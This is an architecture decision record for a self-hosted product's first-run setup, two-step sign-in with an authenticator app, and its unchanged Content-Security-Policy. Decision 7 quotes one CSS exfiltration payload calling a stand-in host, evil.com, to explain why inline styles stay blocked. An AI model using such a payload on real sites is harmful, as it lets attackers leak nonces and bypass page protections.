# ADR-0056: First run walks you in; sign-in is two steps; the second factor is an authenticator app

**Status:** accepted 2026-09-22. **Amends** ADR-0055 decision 10 (the sign-in shape and the names)
and the client half of decision 1. Everything else in ADR-0055 stands.

## The ask, in the owner's words (2026-09-22)

*"It should know that this is the first time someone is signing up, and walk them through it. You
have like 3 options and that is just clunky. Look what others do please. It should just walk the
first person through the process, give an error if the email doesn't match, the 2factor isn't
detected by bitwarden for some reason. App code is a terrible name for that."*

Said in front of the real deployment, after the ADR-0055 build: three fields, three links, a
refusal sentence written for the audit trail, and an enrolment screen a password manager could
not see.

## What was looked at

- `docs/archive/2026-09-22-first-run-survey.md`: ten self-hosted products, read from their own
  docs and UI source on 2026-09-22. Eight of ten redirect every visitor to one
  create-the-first-administrator page until one exists; **none shows a sign-in page with a setup
  link**; only Portainer requires a token from the server logs, added after advisory
  GHSA-x626-fcwx-f5pc (2026-07-02) and rendered as a labelled field on that page; **the second
  factor is never on the first sign-in page**; nobody enrols it during first run; every product
  that has it shows a QR code plus the manual key; the factor is called an "authenticator app"
  (Bitwarden, Nextcloud, Home Assistant) and the field a "verification code" (Bitwarden, Proxmox)
  or "authentication code" (Nextcloud, Authentik). Nobody says "app code".
- Firefox applies a page's CSP to an inline `<style>` an extension content script fills through
  `appendChild(createTextNode(...))` (`layout/style/nsStyleUtil.cpp` `CSPAllowsInlineStyle` and
  `dom/html/HTMLStyleElement.cpp`, mozilla/gecko-dev master, read 2026-09-22), while W3C CSP3
  says a policy *"SHOULD NOT interfere with the operation of user-agent features like addons,
  extensions"* and that Chrome exempts them (w3c/webappsec-csp `index.bs`, read 2026-09-22). So the
  console noise the owner sees is Firefox's behaviour, not a misconfiguration, and no page can
  exempt one extension. What Bitwarden's blocked sheet does is neutralise `::before`, `::after`
  and `::backdrop` on its own host element (bitwarden/clients
  `autofill-inline-menu-iframe-element.ts`, commit 7649824c, read 2026-09-22); its menu iframe
  and positioning go through paths Firefox does not check against the page policy.
- Bitwarden captures an authenticator secret **only** by decoding a QR code out of a screenshot
  of the visible tab (`browser-totp-capture.service.ts`, same commit): text, copy buttons and an
  `otpauth://` link are invisible to it. It detects the code field by
  `autocomplete="one-time-code"` first, keywords second (`inline-menu-field-qualification.service.ts`).
  Its own labels: "Authenticator app", "Authenticator key (TOTP)", "Verification code". GitHub's:
  "Scan the QR code", "setup key", "Verify the code from the app" (github/docs
  `data/reusables/two_fa/enable-totp-app-method.md`, read 2026-09-22).
- Enumeration: OWASP ASVS 5.0.0 **6.3.8** (level 3): *"Verify that valid users cannot be deduced
  from failed authentication challenges, such as by basing on error messages, HTTP response
  codes, or different response times. Registration and forgot password functionality must also
  have this protection."* And the OWASP Authentication Cheat Sheet: one generic message whether
  the id or password was wrong, the account does not exist, or it is locked. NIST SP 800-63B
  (rev 3 and rev 4, full-text searched 2026-09-22) has no enumeration clause; a chat message on
  2026-09-22 attributed the rule to NIST, which was wrong. ADR-0055 cites it correctly as ASVS.
- Jenkins keeps installation as one instance-wide state (`jenkins/install/InstallState.java`:
  `NEW`, `INITIAL_SECURITY_SETUP`, `CREATE_ADMIN_USER`, `INITIAL_SETUP_COMPLETED`, `RUNNING`),
  unlocked by a secret only the filesystem holder can read. Portainer answers
  `RequiresSetupToken` and draws the token field only when the server says so.

## Decisions

1. **The server says whether setup is finished, for the deployment as a whole.**
   `GET /setup/state`, unauthenticated, answers `LP("pending")` while the install's first operator
   has no stored credential (no password yet), and `LP("done")` afterwards, for ever. It is one bit
   about the deployment, never about an address, so ASVS 6.3.8 is untouched: the per-address
   answers stay identical in content and time. The bit is already visible to anyone who can reach
   the page, since the setup screen is what they would see.
2. **While pending, the client shows the setup flow and nothing else.** No sign-in page, no links.
   The steps, each one screen, each saying what it wants and why:
   1. *Welcome.* "This server has just been set up. Prove you are the person who installed it."
      One field, **Setup token**, with the hint: the whole line from the file named in the
      server's log, copied out with `docker compose cp`. The client asks
      `POST /enrolment/operator/setup/check` with `LP(token)`; the server answers `LP(address)`
      for a live setup token and spends nothing. A wrong or spent token gets Portainer's shape of
      answer: "Setup token is missing or invalid. Find the current token in the server's token
      file." The address is never typed, so it can never mismatch: the owner's ask is met by
      removing the field.
   2. *Choose a password* for the address the server named, fifteen characters or more, said
      inline. This spends the token (`POST /enrolment/operator/setup`, unchanged) and signs the
      person in to the setup-only session ADR-0055 decision 10 describes.
   3. *Set up your authenticator app.* A QR code drawn on the page, the **setup key** beside it
      for manual entry, the `otpauth://` URI for the person who wants it, and one field,
      **Verification code**, `autocomplete="one-time-code"`.
   4. *Recovery codes*, shown once, with copy and download, and a checkbox "I have saved these".
   5. *Done.* Land on Home, signed in, with the operator console one press away.
   Every product surveyed lands the first administrator in the product; so does this.
3. **Sign-in is two steps.** Step one: address and password. If the account holds a confirmed
   authenticator, the server answers a typed **second factor needed** instead of a session, and
   step two asks for the verification code, or a recovery code in the same field. The server's
   one-request verification is unchanged: the client sends the code with the address and password
   again, and nothing is issued until all of it verifies. **What this gives up, named:** the
   second step tells the person who typed the right password that it was right. Every surveyed
   product with a second factor makes the same trade; it is not what 6.3.8 forbids (deducing a
   *valid user* from a *failed* challenge), and the sign-in rate limits and the account bucket
   already bound the guesses that lead there. A wrong address or password still gets one sentence.
4. **Names.** The factor is an **authenticator app**; the six digits are a **verification code**;
   the base32 secret is the **setup key**; the ten single-use codes are **recovery codes**. "App
   code" and "backup code" leave every user-facing string, the docs and the log lines meant for
   people. Server identifiers, routes, column names and sealed entry types keep their names;
   renaming a column is not a UX change.
5. **The enrolment screen draws the QR code itself**, as inline SVG from a zero-dependency
   encoder, so `img-src` and the rest of the policy do not move. A password manager that
   photographs the page then works; one that pastes the setup key works already.
6. **Two links under sign-in at most, and one of them waits for mail.** "Forgot your password?"
   opens the reset door (it says today that mail is not built and what the host command is).
   Invitations are redeemed at their own address carried by the invitation
   (`/invite#<token>`, the token in the fragment so it never reaches a log), and the console
   shows that address next to the token it minted; no link under sign-in. The first-operator link
   is gone: decision 1 makes it the server's call.
7. **The Content-Security-Policy does not change.** Loosening `style-src-elem` to
   `'unsafe-inline'` for one extension's pseudo-element sheet would hand any HTML injection a
   CSS exfiltration channel (CSP3 §"Nonce exfiltration via content attributes":
   `script[nonce=a] { background: url("https://evil.com/nonce?a") }`), and a nonce cannot match
   a sheet the extension writes without one. The signed-in screens are driven in a real browser
   with violation capture as part of this build (they were not before). Whether
   `style-src-attr 'unsafe-inline'` is needed at all (React applies `style` through the CSSOM,
   which Gecko never checks) is a later measurement, not a belief.
8. **Recovery is unchanged.** Recovery codes for the lost phone; `fathom-server recover-operator`
   on the host; reset by mail when mail exists (`docs/NEXT.md`).
9. **After setup there must be something to open.** The organisation claim over HTTP is the next
   decision, and one question in it is the owner's (`docs/OPEN-QUESTIONS.md`: the root private
   key after genesis). This ADR does not decide it.

## Consequences

- A fresh install is a single guided path from a blank browser to a signed-in operator with a
  second factor, and an upgraded install is the same path from the adopted operator (ADR-0055
  decision 2 as amended 2026-09-21).
- One new unauthenticated route (`GET /setup/state`), one new token-holder route
  (`POST /enrolment/operator/setup/check`), one new typed sign-in answer (second factor needed),
  one QR encoder in the client, a rename across the client, the docs and the CI sign-in script,
  and the drive scripts re-taught the new screens.
- Nothing in the credential model, the sealing, the quorum or the console placement moves.

## Order of work

S1 server: the state route, the check route, the second-factor answer; tests. C1 client: the
setup flow, the two-step sign-in, the invitation address. C2 client: the QR encoder, the renames,
the recovery-codes screen. D: docs, `scripts/ci/first-operator-signin.mjs`, the drive scripts, a
signed-in CSP drive. A checker attacks each stream before it is merged.
